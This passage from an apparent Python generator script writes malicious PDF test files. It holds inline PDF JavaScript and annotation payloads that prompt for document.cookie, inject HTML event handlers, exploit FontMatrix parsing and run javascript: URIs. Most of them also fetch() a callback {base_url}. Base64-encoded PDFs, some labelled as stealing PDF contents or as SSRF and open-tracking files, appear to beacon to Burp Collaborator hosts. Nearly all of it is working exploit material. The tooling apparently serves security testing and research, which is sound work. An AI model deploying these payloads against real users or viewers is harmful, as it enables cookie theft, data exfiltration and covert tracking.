/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/S /JavaScript
/JS (app.alert\\(1\\); confirm\\(2\\); prompt\\(document.cookie\\); document.write\\("<iframe src='{base_url}/xss5'>"\\);)
>>
endobj
4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    if should_generate_type('xss'):
        with open(xss_dir / "xss5_js_bypass_apis.pdf", 'wb') as f:
            f.write(pdf_xss5_js_bypass_apis.encode())
    
    pdf_xss6_uri_javascript = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Annots [4 0 R]
>>
endobj
4 0 obj
<<
/Type /Annot
/Subtype /Link
/Rect [100 100 200 200]
/A <<
/S /URI
/URI (javascript:confirm\\(2\\);fetch('{base_url}/xss6');)
>>
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    if should_generate_type('xss'):
        with open(xss_dir / "xss6_uri_javascript.pdf", 'wb') as f:
            f.write(pdf_xss6_uri_javascript.encode())
    
    pdf_xss7_annotation_v = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Annots [4 0 R]
>>
endobj
4 0 obj
<<
/Type /Annot
/Subtype /Link
/Rect [100 100 200 200]
/V (\\">'></div><details/open/ontoggle=confirm(document.cookie);fetch('{base_url}/xss7');></details>)
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    if should_generate_type('xss'):
        with open(xss_dir / "xss7_annotation_v.pdf", 'wb') as f:
            f.write(pdf_xss7_annotation_v.encode())
    
    pdf_xss8_fontmatrix = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Resources <<
/Font <<
/F1 5 0 R
>>
>>
/Contents 6 0 R
>>
endobj
4 0 obj
<<
/Type /FontDescriptor
/FontName /SNCSTG+CMBX12
>>
endobj
5 0 obj
<<
/BaseFont /SNCSTG+CMBX12
/FontDescriptor 4 0 R
/FontMatrix [ 1 2 3 4 5 (1\\); alert\\('origin: '+window.origin+', pdf url: '+\\\\(window.PDFViewerApplication?window.PDFViewerApplication.url:document.URL\\);fetch('{base_url}/xss8');) ]
/Subtype /Type1
/Type /Font
>>
endobj
6 0 obj
<<
/Length 0
>>
stream
endstream
endobj
xref
0 7
trailer
<<
/Size 7
/Root 1 0 R
>>
startxref
0
%%EOF'''
    if should_generate_type('xss'):
        with open(xss_dir / "xss8_fontmatrix.pdf", 'wb') as f:
            f.write(pdf_xss8_fontmatrix.encode())
    
    pdf_xss9_js_sandbox_bypass_apryse = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/Names <<
/JavaScript <<
/Names [(test) 3 0 R]
>>
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/S /JavaScript
/JS (app.alert\\(1\\); console.println\\(delete window\\); console.println\\(delete confirm\\); console.println\\(delete document\\); window.confirm\\(document.cookie\\);fetch('{base_url}/xss9');)
>>
endobj
4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    if should_generate_type('xss'):
        with open(xss_dir / "xss9_js_sandbox_bypass_apryse.pdf", 'wb') as f:
            f.write(pdf_xss9_js_sandbox_bypass_apryse.encode())
    
    pdf_xss10_data_uri_simple = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Annots [4 0 R]
>>
endobj
4 0 obj
<<
/Type /Annot
/Subtype /Link
/Rect [100 100 200 200]
/A <<
/S /URI
/URI (data:text/html,<script>alert(1)</script>)
>>
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    if should_generate_type('xss'):
        with open(xss_dir / "xss10_data_uri_simple.pdf", 'wb') as f:
            f.write(pdf_xss10_data_uri_simple.encode())
    
    pdf_xss11_uri_javascript_simple = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Annots [4 0 R]
>>
endobj
4 0 obj
<<
/Type /Annot
/Subtype /Link
/Rect [100 100 200 200]
/A <<
/S /URI
/URI (javascript:alert(1))
>>
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    if should_generate_type('xss'):
        with open(xss_dir / "xss11_uri_javascript_simple.pdf", 'wb') as f:
            f.write(pdf_xss11_uri_javascript_simple.encode())
    
    pdf_xss12_js_simple = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/Names <<
/JavaScript <<
/Names [(test) 3 0 R]
>>
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/S /JavaScript
/JS (app.alert(1);)
>>
endobj
4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    if should_generate_type('xss'):
        with open(xss_dir / "xss12_js_simple.pdf", 'wb') as f:
            f.write(pdf_xss12_js_simple.encode())
    
    # Contenus PDF intégrés depuis portable-data-exfiltration

    pdf_xss13_pdflib_acrobat_alert_1_of_pdf_injection_content = base64.b64decode('JVBERi0xLjcKJYGBgYEKCjcgMCBvYmoKPDwKL0ZpbHRlciAvRmxhdGVEZWNvZGUKL0xlbmd0aCAxMDkKPj4Kc3RyZWFtCnicDYqxCgJBDAX7fMWrhTuT7NvNHYiFYGcl+QELFYVVOP8fXAammTmlKHSuZSgM21P2+er333T99ttnWpcgiiIf4kRexDB2GKoi3OZlRXY5VLYaJega2tia20BpdBaSIzOOyLfkTs4pfxATGVsKZW5kc3RyZWFtCmVuZG9iagoKOSAwIG9iago8PAovRmlsdGVyIC9GbGF0ZURlY29kZQovVHlwZSAvT2JqU3RtCi9OIDcKL0ZpcnN0IDM4Ci9MZW5ndGggNDkxCj4+CnN0cmVhbQp4nNVTS4/TMBC++1fMsTm0fsRJnKWq1FcECytW7SIQiIObWCXQtaskXS3/nrGT7nYPCDiiaBLPzOd55RsODARICTFkCiQksYAEUp5CCipmoCDnAqZTQu9+Hg3QW703LaFv66qFL4hksIGvhC7dyXbAyWxGnrFL3emD25P+EnAPPiNuG1edStPAtFgXBWMZYyyVKCljYoXfJUqOIlBHn1B4RsnkIGjLYsbiOfqKXtKsv+P9AZsM99f4RWzqMaseK1WvP+X1udZ9DPGnevIZoTeuWunOwGh1JbBCzgT3iUX+OcJxNEZ37v9tLtRfO/vbDl/858LZjtDtadcF1Rs5oQvdGu9BQ31v2vHG3WtL6NqWrqrtHujH2s5tW58NL2N6ynjiNMbzKjCHbkzrTk2JVPK4ENsfXpvDg+nqUo+lVMjdHnyRdJyrTCK3g/0ZrdIsHdCYmn56v/tuyhASVW+5MVWtF+4Ric7wSfJkIhQoyScq70lvOyzPL0J2XoS5tS5Y1GD5p0k9FffXcwr5LkK+q+0PPylsBNeTQSZTX20s8MjPhS9cU+Hq9W2J0Mqg8NDDxb7PS88DTAD0w+YN8S8Y0d1Bf4voll7rB70tm/rY0evtSB+PE30wTTfi0asoBBju0wIYHUXDYH8BrJ0e7wplbmRzdHJlYW0KZW5kb2JqCgoxMCAwIG9iago8PAovU2l6ZSAxMQovUm9vdCAyIDAgUgovSW5mbyAzIDAgUgovRmlsdGVyIC9GbGF0ZURlY29kZQovVHlwZSAvWFJlZgovTGVuZ3RoIDQ2Ci9XIFsgMSAyIDIgXQovSW5kZXggWyAwIDExIF0KPj4Kc3RyZWFtCnicJcmxDQAgDAPBdwJI6ejYfxnWCrJorjmgOygwMmHSDDPF/rvEBeWBB3pHA1QKZW5kc3RyZWFtCmVuZG9iagoKc3RhcnR4cmVmCjc5MQolJUVPRg==')
    pdf_xss14_pdflib_acrobat_steal_contents_of_pdf_with_js_content = base64.b64decode('JVBERi0xLjcKJYGBgYEKCjcgMCBvYmoKPDwKL0ZpbHRlciAvRmxhdGVEZWNvZGUKL0xlbmd0aCAxMDkKPj4Kc3RyZWFtCnicDYqxCgJBDAX7fMWrhTuT7NvNHYiFYGcl+QELFYVVOP8fXAammTmlKHSuZSgM21P2+er333T99ttnqisXFEU+xIm8iGHsMFRFuM3LiuxyqGw1StA1tLE1t4HS6CwkR2YckW/JnZxT/g9gGVkKZW5kc3RyZWFtCmVuZG9iagoKOSAwIG9iago8PAovRmlsdGVyIC9GbGF0ZURlY29kZQovVHlwZSAvT2JqU3RtCi9OIDcKL0ZpcnN0IDM4Ci9MZW5ndGggNTgyCj4+CnN0cmVhbQp4nNVT227bMAx911fwrQmwRpLv7gIDaRNj6wUrkhUbNuxBtoVUbSK5thKsGPbvo2ynl4dh2+Ng0BapI/JQPuTAwIMgAB/iBAIIfQ9CiHgEESReAgmknMF0SujHx1oCvRZr2RJ6oaoWviKSwRK+EXpmdtoCJ1lGnrFnwoqNWZP+EHAHPiCuG1PtStnANF/kOWMxYywK0CLGvDl+z9BSNA993PMSXKPFwWAYi33G/Bnu5b1FcX/G7XfYcDi/wC9iI4eZ99gg6f2nuq7Wos/h/YlPmhF6Zaq5sBJG8xMPGXLGI5b4nKdfxngdjRTW/L/NdfyV0b/t8NV/zo22hK52he1cF+SEnopWuh0MqK1sj5dmKzShC12aSuk10E9Kz3SrDoHXOZ1knHAa6XTVKYcuZWt2TYlScrgut1u8k5u9tKoUx2HoJ6jbDvyi6HGYBk7bXfwZ7QUDFgvTzx+KO1l2CdF1kStZKXFqvqPMGT5hGk7cPAR8kqS95LVFcm4M4sMYzLQ2XSQZIv90T0/U/vqWunovUl4qfe/uCRvB4WQQB5Fj63u45Afip6apcPD6tryulcHhXQ8vpn1WOhVgAaA3y/fEvWBEi424HWcZnU2ndEXPxV6sykbVlp6vRqKuJ2IjGzvi47fE3qp20u6KrbK5abajH6S8WV6ewNGttXV7QulDfZcUohK80fv7B10XldeWpYq3j229lpNi19Sl2WxEYRo3UBMt7dGbctVlnLWY6HqeH/0cj3vCA1+klgPLshEZDz/zF8R8RkUKZW5kc3RyZWFtCmVuZG9iagoKMTAgMCBvYmoKPDwKL1NpemUgMTEKL1Jvb3QgMiAwIFIKL0luZm8gMyAwIFIKL0ZpbHRlciAvRmxhdGVEZWNvZGUKL1R5cGUgL1hSZWYKL0xlbmd0aCA0NQovVyBbIDEgMiAyIF0KL0luZGV4IFsgMCAxMSBdCj4+CnN0cmVhbQp4nCXJsQ0AIAwDwXcCSOmYlSFZK8iiueaA7qDAyIRJM8wU++8SF5QHHntYA68KZW5kc3RyZWFtCmVuZG9iagoKc3RhcnR4cmVmCjg4MgolJUVPRg==')
    pdf_xss15_pdflib_acrobat_steal_contents_of_pdf_without_js_content = base64.b64decode('JVBERi0xLjcKJYGBgYEKCjcgMCBvYmoKPDwKL0ZpbHRlciAvRmxhdGVEZWNvZGUKL0xlbmd0aCAxMDkKPj4Kc3RyZWFtCnicDYqxCgJBDAX7fMWrhTuT3ZeNB2JxcJ2V5AcsVBRWQf8fXAammVlTFDp7HQrD9yH7fPbbb7p8+vU9Le6Gqsi7FCLPYhg7DK6IYvNhQXY5OptHDRYNbWyt2EBpLKwkR2ackC/JnWwpfw1zGVMKZW5kc3RyZWFtCmVuZG9iagoKOSAwIG9iago8PAovRmlsdGVyIC9GbGF0ZURlY29kZQovVHlwZSAvT2JqU3RtCi9OIDcKL0ZpcnN0IDM4Ci9MZW5ndGggNTM4Cj4+CnN0cmVhbQp4nNVTS2/bMAy++1fwmBwSPfwuAgN5GRu2YkW6ocOGHWRbSN06kmsrRfvvR8lOmx6KbcfBoC1Sn/iR8kcGFDgEAfgQJxBA6HMIIWIRRJD4FBJIGYfFwiNfn1sJ5ErsZe+RT3XVw09EUtjBL4+s9VEZYF6Wea/YtTCi0XtvOATMgk+Iq05Xx1J2sMi3eU5pTCmNArSIUr7B7xotRePo4x5PcI0WB6NhLPYp9Ze4lw8WxcMZu++w4Xh+i1/ERhazGbBBMvgvvJZrO+Tgf6onzTxyqauNMBImmwuOFTLKIpqEnEU/pngdnRRG/7/Nufprrd7t8M1/zrUyHrk+Fsa5Nsg8shK9tDsYqA+yn+30QSiPbFWpq1rtgdzUaqn6+hR4m9NKxgqnk1ZXTjlkJ3t97EqUksW53HbxQTaP0tSlmPEwpqhbBz4jnaVhyFDbLv6KZiHzRzRSk+9fijtZupTo2silrGqx0k8odIpPmIZznkASsHmSDqJXBsuzgxCfBmGplHaRZIz80029FPfX9+T4zlJ+rtW9vSlsBMeTQhxEtlqf45KdCl/prsLRG9rirpXRYa6Hs3lfllYHSADk2+6jZ18wIUUjbqdZRpaLBbm25Ifa5Lo7kLwR+x54GJF8cmtM218Q8tDeJYWoBOvU4/2DaouK92VZx4fnvt3LeXHs2lI3jSh0Z4dmrqSZOvaRHHlyoFk2mY4/5jfMMDYwCmVuZHN0cmVhbQplbmRvYmoKCjEwIDAgb2JqCjw8Ci9TaXplIDExCi9Sb290IDIgMCBSCi9JbmZvIDMgMCBSCi9GaWx0ZXIgL0ZsYXRlRGVjb2RlCi9UeXBlIC9YUmVmCi9MZW5ndGggNDUKL1cgWyAxIDIgMiBdCi9JbmRleCBbIDAgMTEgXQo+PgpzdHJlYW0KeJwlybENACAMA8F3AkjpmIrRWSvIornmgO6gwMiESTPMFPvvEheUBx561AODCmVuZHN0cmVhbQplbmRvYmoKCnN0YXJ0eHJlZgo4MzgKJSVFT0Y=')
    pdf_ssrf25_jspdf_acrobat_make_entire_document_clickable_content = base64.b64decode('JVBERi0xLjMKJbrfrOAKMyAwIG9iago8PC9UeXBlIC9QYWdlCi9QYXJlbnQgMSAwIFIKL1Jlc291cmNlcyAyIDAgUgovTWVkaWFCb3ggWzAgMCA1OTUuMjc5OTk5OTk5OTk5OTcyNyA4NDEuODg5OTk5OTk5OTk5OTg2NF0KL0Fubm90cyBbCjw8L1R5cGUgL0Fubm90IC9TdWJ0eXBlIC9MaW5rIC9SZWN0IFswLiA4MTMuNTQzNTQzMzA3MDg2NTY1NiA1NjYuOTI5MTMzODU4MjY3NzMyNiAyNDYuNjE0NDA5NDQ4ODE4ODMzXSAvQm9yZGVyIFswIDAgMF0gL0EgPDwvUyAvVVJJIC9VUkkgKC8pID4+ID4+PDwvVHlwZSAvQW5ub3QgL1N1YnR5cGUgL0xpbmsgL1JlY3QgWzAgMCA4MDAgNjAwXSAvQm9yZGVyIFswIDAgMF0gL0EgPDwvUy9TdWJtaXRGb3JtL0ZsYWdzIDI1Ni9GKGh0dHBzOi8vNzVhcHJydHJoODNjMDczNnJ1aTlzdHlvMmY4N3d3LmJ1cnBjb2xsYWJvcmF0b3IubmV0KSA+PiA+PgpdCi9Db250ZW50cyA0IDAgUgo+PgplbmRvYmoKNCAwIG9iago8PAovTGVuZ3RoIDE0NQo+PgpzdHJlYW0KMC41NjcwMDAwMDAwMDAwMDAxIHcKMCBHCkJUCi9GMSAxNiBUZgoxOC4zOTk5OTk5OTk5OTk5OTg2IFRMCjAgZwo1Ni42OTI5MTMzODU4MjY3Nzc1IDc4NS4xOTcwODY2MTQxNzMyNTg2IFRkCihFbnRpcmUgZG9jdW1lbnQgaXMgY2xpY2thYmxlKSBUagpFVAplbmRzdHJlYW0KZW5kb2JqCjEgMCBvYmoKPDwvVHlwZSAvUGFnZXMKL0tpZHMgWzMgMCBSIF0KL0NvdW50IDEKPj4KZW5kb2JqCjUgMCBvYmoKPDwKL1R5cGUgL0ZvbnQKL0Jhc2VGb250IC9IZWx2ZXRpY2EKL1N1YnR5cGUgL1R5cGUxCi9FbmNvZGluZyAvV2luQW5zaUVuY29kaW5nCi9GaXJzdENoYXIgMzIKL0xhc3RDaGFyIDI1NQo+PgplbmRvYmoKNiAwIG9iago8PAovVHlwZSAvRm9udAovQmFzZUZvbnQgL0hlbHZldGljYS1Cb2xkCi9TdWJ0eXBlIC9UeXBlMQovRW5jb2RpbmcgL1dpbkFuc2lFbmNvZGluZwovRmlyc3RDaGFyIDMyCi9MYXN0Q2hhciAyNTUKPj4KZW5kb2JqCjcgMCBvYmoKPDwKL1R5cGUgL0ZvbnQKL0Jhc2VGb250IC9IZWx2ZXRpY2EtT2JsaXF1ZQovU3VidHlwZSAvVHlwZTEKL0VuY29kaW5nIC9XaW5BbnNpRW5jb2RpbmcKL0ZpcnN0Q2hhciAzMgovTGFzdENoYXIgMjU1Cj4+CmVuZG9iago4IDAgb2JqCjw8Ci9UeXBlIC9Gb250Ci9CYXNlRm9udCAvSGVsdmV0aWNhLUJvbGRPYmxpcXVlCi9TdWJ0eXBlIC9UeXBlMQovRW5jb2RpbmcgL1dpbkFuc2lFbmNvZGluZwovRmlyc3RDaGFyIDMyCi9MYXN0Q2hhciAyNTUKPj4KZW5kb2JqCjkgMCBvYmoKPDwKL1R5cGUgL0ZvbnQKL0Jhc2VGb250IC9Db3VyaWVyCi9TdWJ0eXBlIC9UeXBlMQovRW5jb2RpbmcgL1dpbkFuc2lFbmNvZGluZwovRmlyc3RDaGFyIDMyCi9MYXN0Q2hhciAyNTUKPj4KZW5kb2JqCjEwIDAgb2JqCjw8Ci9UeXBlIC9Gb250Ci9CYXNlRm9udCAvQ291cmllci1Cb2xkCi9TdWJ0eXBlIC9UeXBlMQovRW5jb2RpbmcgL1dpbkFuc2lFbmNvZGluZwovRmlyc3RDaGFyIDMyCi9MYXN0Q2hhciAyNTUKPj4KZW5kb2JqCjExIDAgb2JqCjw8Ci9UeXBlIC9Gb250Ci9CYXNlRm9udCAvQ291cmllci1PYmxpcXVlCi9TdWJ0eXBlIC9UeXBlMQovRW5jb2RpbmcgL1dpbkFuc2lFbmNvZGluZwovRmlyc3RDaGFyIDMyCi9MYXN0Q2hhciAyNTUKPj4KZW5kb2JqCjEyIDAgb2JqCjw8Ci9UeXBlIC9Gb250Ci9CYXNlRm9udCAvQ291cmllci1Cb2xkT2JsaXF1ZQovU3VidHlwZSAvVHlwZTEKL0VuY29kaW5nIC9XaW5BbnNpRW5jb2RpbmcKL0ZpcnN0Q2hhciAzMgovTGFzdENoYXIgMjU1Cj4+CmVuZG9iagoxMyAwIG9iago8PAovVHlwZSAvRm9udAovQmFzZUZvbnQgL1RpbWVzLVJvbWFuCi9TdWJ0eXBlIC9UeXBlMQovRW5jb2RpbmcgL1dpbkFuc2lFbmNvZGluZwovRmlyc3RDaGFyIDMyCi9MYXN0Q2hhciAyNTUKPj4KZW5kb2JqCjE0IDAgb2JqCjw8Ci9UeXBlIC9Gb250Ci9CYXNlRm9udCAvVGltZXMtQm9sZAovU3VidHlwZSAvVHlwZTEKL0VuY29kaW5nIC9XaW5BbnNpRW5jb2RpbmcKL0ZpcnN0Q2hhciAzMgovTGFzdENoYXIgMjU1Cj4+CmVuZG9iagoxNSAwIG9iago8PAovVHlwZSAvRm9udAovQmFzZUZvbnQgL1RpbWVzLUl0YWxpYwovU3VidHlwZSAvVHlwZTEKL0VuY29kaW5nIC9XaW5BbnNpRW5jb2RpbmcKL0ZpcnN0Q2hhciAzMgovTGFzdENoYXIgMjU1Cj4+CmVuZG9iagoxNiAwIG9iago8PAovVHlwZSAvRm9udAovQmFzZUZvbnQgL1RpbWVzLUJvbGRJdGFsaWMKL1N1YnR5cGUgL1R5cGUxCi9FbmNvZGluZyAvV2luQW5zaUVuY29kaW5nCi9GaXJzdENoYXIgMzIKL0xhc3RDaGFyIDI1NQo+PgplbmRvYmoKMTcgMCBvYmoKPDwKL1R5cGUgL0ZvbnQKL0Jhc2VGb250IC9aYXBmRGluZ2JhdHMKL1N1YnR5cGUgL1R5cGUxCi9GaXJzdENoYXIgMzIKL0xhc3RDaGFyIDI1NQo+PgplbmRvYmoKMTggMCBvYmoKPDwKL1R5cGUgL0ZvbnQKL0Jhc2VGb250IC9TeW1ib2wKL1N1YnR5cGUgL1R5cGUxCi9GaXJzdENoYXIgMzIKL0xhc3RDaGFyIDI1NQo+PgplbmRvYmoKMiAwIG9iago8PAovUHJvY1NldCBbL1BERiAvVGV4dCAvSW1hZ2VCIC9JbWFnZUMgL0ltYWdlSV0KL0ZvbnQgPDwKL0YxIDUgMCBSCi9GMiA2IDAgUgovRjMgNyAwIFIKL0Y0IDggMCBSCi9GNSA5IDAgUgovRjYgMTAgMCBSCi9GNyAxMSAwIFIKL0Y4IDEyIDAgUgovRjkgMTMgMCBSCi9GMTAgMTQgMCBSCi9GMTEgMTUgMCBSCi9GMTIgMTYgMCBSCi9GMTMgMTcgMCBSCi9GMTQgMTggMCBSCj4+Ci9YT2JqZWN0IDw8Cj4+Cj4+CmVuZG9iagoxOSAwIG9iago8PAovUHJvZHVjZXIgKGpzUERGIDIuMS4xKQovQ3JlYXRpb25EYXRlIChEOjIwMjAxMDIzMDg0NTMxKzAxJzAwJykKPj4KZW5kb2JqCjIwIDAgb2JqCjw8Ci9UeXBlIC9DYXRhbG9nCi9QYWdlcyAxIDAgUgovT3BlbkFjdGlvbiBbMyAwIFIgL0ZpdEggbnVsbF0KL1BhZ2VMYXlvdXQgL09uZUNvbHVtbgo+PgplbmRvYmoKeHJlZgowIDIxCjAwMDAwMDAwMDAgNjU1MzUgZiAKMDAwMDAwMDY3MCAwMDAwMCBuIAowMDAwMDAyNDg3IDAwMDAwIG4gCjAwMDAwMDAwMTUgMDAwMDAgbiAKMDAwMDAwMDQ3NCAwMDAwMCBuIAowMDAwMDAwNzI3IDAwMDAwIG4gCjAwMDAwMDA4NTIgMDAwMDAgbiAKMDAwMDAwMDk4MiAwMDAwMCBuIAowMDAwMDAxMTE1IDAwMDAwIG4gCjAwMDAwMDEyNTIgMDAwMDAgbiAKMDAwMDAwMTM3NSAwMDAwMCBuIAowMDAwMDAxNTA0IDAwMDAwIG4gCjAwMDAwMDE2MzYgMDAwMDAgbiAKMDAwMDAwMTc3MiAwMDAwMCBuIAowMDAwMDAxOTAwIDAwMDAwIG4gCjAwMDAwMDIwMjcgMDAwMDAgbiAKMDAwMDAwMjE1NiAwMDAwMCBuIAowMDAwMDAyMjg5IDAwMDAwIG4gCjAwMDAwMDIzOTEgMDAwMDAgbiAKMDAwMDAwMjczNSAwMDAwMCBuIAowMDAwMDAyODIxIDAwMDAwIG4gCnRyYWlsZXIKPDwKL1NpemUgMjEKL1Jvb3QgMjAgMCBSCi9JbmZvIDE5IDAgUgovSUQgWyA8NjRGQzdGQjg1MUE2QThFQTA3RjJGMzU5NEY3Qjg2MDk+IDw2NEZDN0ZCODUxQTZBOEVBMDdGMkYzNTk0RjdCODYwOT4gXQo+PgpzdGFydHhyZWYKMjkyNQolJUVPRg==')
    pdf_ssrf26_jspdf_acrobat_track_when_opening_pdf_filesystem_content = base64.b64decode('JVBERi0xLjMKJbrfrOAKMyAwIG9iago8PC9UeXBlIC9QYWdlCi9QYXJlbnQgMSAwIFIKL1Jlc291cmNlcyAyIDAgUgovTWVkaWFCb3ggWzAgMCA1OTUuMjc5OTk5OTk5OTk5OTcyNyA4NDEuODg5OTk5OTk5OTk5OTg2NF0KL0Fubm90cyBbCjw8L1R5cGUgL0Fubm90IC9TdWJ0eXBlIC9MaW5rIC9SZWN0IFswLiA4MTMuNTQzNTQzMzA3MDg2NTY1NiA1NjYuOTI5MTMzODU4MjY3NzMyNiAyNDYuNjE0NDA5NDQ4ODE4ODMzXSAvQm9yZGVyIFswIDAgMF0gL0EgPDwvUyAvVVJJIC9VUkkgKC8pID4+ID4+Cjw8L1N1YnR5cGUgL1NjcmVlbiAvUmVjdCBbMCAwIDkwMCA5MDBdIC9BQSA8PC9QViA8PC9TL0phdmFTY3JpcHQvSlMoYXBwLmFsZXJ0KDEzMzcpO0NCU2hhcmVkUmV2aWV3SWZPZmZsaW5lRGlhbG9nKCdodHRwczovL29wZW5lZC5xZTg4MGEyYXFyY3Y5cWNwMGRyczFjNzdieWhvNWQuYnVycGNvbGxhYm9yYXRvci5uZXQnKSk+Pi8oKSA+PiA+PgpdCi9Db250ZW50cyA0IDAgUgo+PgplbmRvYmoKNCAwIG9iago8PAovTGVuZ3RoIDEzOQo+PgpzdHJlYW0KMC41NjcwMDAwMDAwMDAwMDAxIHcKMCBHCkJUCi9GMSAxNiBUZgoxOC4zOTk5OTk5OTk5OTk5OTg2IFRMCjAgZwo1Ni42OTI5MTMzODU4MjY3Nzc1IDc4NS4xOTcwODY2MTQxNzMyNTg2IFRkCihBdXRvIGV4ZWN1dGUgd2hlbiBvcGVuKSBUagpFVAplbmRzdHJlYW0KZW5kb2JqCjEgMCBvYmoKPDwvVHlwZSAvUGFnZXMKL0tpZHMgWzMgMCBSIF0KL0NvdW50IDEKPj4KZW5kb2JqCjUgMCBvYmoKPDwKL1R5cGUgL0ZvbnQKL0Jhc2VGb250IC9IZWx2ZXRpY2EKL1N1YnR5cGUgL1R5cGUxCi9FbmNvZGluZyAvV2luQW5zaUVuY29kaW5nCi9GaXJzdENoYXIgMzIKL0xhc3RDaGFyIDI1NQo+PgplbmRvYmoKNiAwIG9iago8PAovVHlwZSAvRm9udAovQmFzZUZvbnQgL0hlbHZldGljYS1Cb2xkCi9TdWJ0eXBlIC9UeXBlMQovRW5jb2RpbmcgL1dpbkFuc2lFbmNvZGluZwovRmlyc3RDaGFyIDMyCi9MYXN0Q2hhciAyNTUKPj4KZW5kb2JqCjcgMCBvYmoKPDwKL1R5cGUgL0ZvbnQKL0Jhc2VGb250IC9IZWx2ZXRpY2EtT2JsaXF1ZQovU3VidHlwZSAvVHlwZTEKL0VuY29kaW5nIC9XaW5BbnNpRW5jb2RpbmcKL0ZpcnN0Q2hhciAzMgovTGFzdENoYXIgMjU1Cj4+CmVuZG9iago4IDAgb2JqCjw8Ci9UeXBlIC9Gb250Ci9CYXNlRm9udCAvSGVsdmV0aWNhLUJvbGRPYmxpcXVlCi9TdWJ0eXBlIC9UeXBlMQovRW5jb2RpbmcgL1dpbkFuc2lFbmNvZGluZwovRmlyc3RDaGFyIDMyCi9MYXN0Q2hhciAyNTUKPj4KZW5kb2JqCjkgMCBvYmoKPDwKL1R5cGUgL0ZvbnQKL0Jhc2VGb250IC9Db3VyaWVyCi9TdWJ0eXBlIC9UeXBlMQovRW5jb2RpbmcgL1dpbkFuc2lFbmNvZGluZwovRmlyc3RDaGFyIDMyCi9MYXN0Q2hhciAyNTUKPj4KZW5kb2JqCjEwIDAgb2JqCjw8Ci9UeXBlIC9Gb250Ci9CYXNlRm9udCAvQ291cmllci1Cb2xkCi9TdWJ0eXBlIC9UeXBlMQovRW5jb2RpbmcgL1dpbkFuc2lFbmNvZGluZwovRmlyc3RDaGFyIDMyCi9MYXN0Q2hhciAyNTUKPj4KZW5kb2JqCjExIDAgb2JqCjw8Ci9UeXBlIC9Gb250Ci9CYXNlRm9udCAvQ291cmllci1PYmxpcXVlCi9TdWJ0eXBlIC9UeXBlMQovRW5jb2RpbmcgL1dpbkFuc2lFbmNvZGluZwovRmlyc3RDaGFyIDMyCi9MYXN0Q2hhciAyNTUKPj4KZW5kb2JqCjEyIDAgb2JqCjw8Ci9UeXBlIC9Gb250Ci9CYXNlRm9udCAvQ291cmllci1Cb2xkT2JsaXF1ZQovU3VidHlwZSAvVHlwZTEKL0VuY29kaW5nIC9XaW5BbnNpRW5jb2RpbmcKL0ZpcnN0Q2hhciAzMgovTGFzdENoYXIgMjU1Cj4+CmVuZG9iagoxMyAwIG9iago8PAovVHlwZSAvRm9udAovQmFzZUZvbnQgL1RpbWVzLVJvbWFuCi9TdWJ0eXBlIC9UeXBlMQovRW5jb2RpbmcgL1dpbkFuc2lFbmNvZGluZwovRmlyc3RDaGFyIDMyCi9MYXN0Q2hhciAyNTUKPj4KZW5kb2JqCjE0IDAgb2JqCjw8Ci9UeXBlIC9Gb250Ci9CYXNlRm9udCAvVGltZXMtQm9sZAovU3VidHlwZSAvVHlwZTEKL0VuY29kaW5nIC9XaW5BbnNpRW5jb2RpbmcKL0ZpcnN0Q2hhciAzMgovTGFzdENoYXIgMjU1Cj4+CmVuZG9iagoxNSAwIG9iago8PAovVHlwZSAvRm9udAovQmFzZUZvbnQgL1RpbWVzLUl0YWxpYwovU3VidHlwZSAvVHlwZTEKL0VuY29kaW5nIC9XaW5BbnNpRW5jb2RpbmcKL0ZpcnN0Q2hhciAzMgovTGFzdENoYXIgMjU1Cj4+CmVuZG9iagoxNiAwIG9iago8PAovVHlwZSAvRm9udAovQmFzZUZvbnQgL1RpbWVzLUJvbGRJdGFsaWMKL1N1YnR5cGUgL1R5cGUxCi9FbmNvZGluZyAvV2luQW5zaUVuY29kaW5nCi9GaXJzdENoYX